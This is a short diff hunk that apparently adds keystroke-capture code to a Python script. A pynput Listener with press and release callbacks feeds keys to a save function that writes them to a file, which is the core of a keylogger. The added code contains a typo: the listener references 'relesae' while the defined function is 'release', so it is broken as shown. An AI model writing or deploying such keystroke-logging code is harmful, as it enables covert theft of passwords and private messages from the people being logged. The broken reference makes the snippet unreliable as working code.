@@ -24,5 +24,11 @@ def save(keys):
             elif _key.find("key") == -1:
                 file.write(_key)
      
-           
+def release(key):
+    if key == Key.esc:
+        return False
+    
+with Listener(on_press=press,
+              on_release=relesae) as listener:
+    listener.join()          
 
